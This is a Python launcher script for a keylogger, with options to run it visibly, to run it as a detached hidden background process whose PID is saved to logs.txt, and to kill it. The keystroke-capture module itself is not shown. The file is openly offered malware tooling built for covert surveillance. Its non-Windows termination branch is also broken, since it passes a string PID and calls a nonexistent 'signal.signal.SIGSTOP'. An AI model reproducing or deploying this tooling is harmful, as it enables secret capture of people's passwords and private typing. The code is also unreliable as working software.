import subprocess, sys, os, signal, art
from rich import print
from keylogger import KeyLogger

def print_info(err):
    if(err):
        print("\n[bold red]ERROR:[/bold red] "+ err)
    print("[bold]USAGE:[/bold] python app.py [italic]OPTIONS[/italic]")
    print("\t-s Open visible process of KeyLogger")
    print("\t-b Open background process of KeyLogger")

if __name__ == "__main__":
    print("")
    art.tprint("KeyLogger")
    print("\t\t\t\t\t[italic]by peppepol[/italic]")
    
    if(len(sys.argv) == 2):
        kl = KeyLogger()

        if(sys.argv[1] == "-s"):
            print_info(False)
            print("\n[bold green]START LOG[/bold green] (PRESS 'esc' to exit)")
            kl.start()

        elif(sys.argv[1] == "-b"):
            f = open("logs.txt", "w+")
            pid = subprocess.Popen(["python","KeyLogger.py"], stdout=f, creationflags=subprocess.DETACHED_PROCESS).pid
            print("\n[bold green]KEYLOGGER STARTED[/bold green]")
            print("PROCESS PID was saved in logs.txt - Use python app.py -k [bold white]" + str(pid) + "[/bold white] to terminate process")
            print("[italic magenta](You can close this console)[/italic magenta]")
            f.write(str(pid))
            exit(0)
        else:
            print_info("Options " + sys.argv[1] + " doesn't exists... Retry")
            exit(-1)

    elif(len(sys.argv) == 3):
        
        if(sys.argv[1] == "-k"):
            
            if(os.name == "nt"):
                f = open("logs.txt", "w+")
                subprocess.Popen(["TASKKILL", "/PID", sys.argv[2], "/F"], stdout=f)
            else:
                os.kill(sys.argv[2], signal.signal.SIGSTOP)

            print("[bold white]PROCESS " + str(sys.argv[2]) + "[/bold white] was killed!")
        else:
            print_info("Options " + sys.argv[1] + " doesn't exists... Retry")
            exit(-1)
    else:
        if(len(sys.argv) != 1):
            print_info("Too many arguments")
        else:
            print_info(False)
        exit(-1)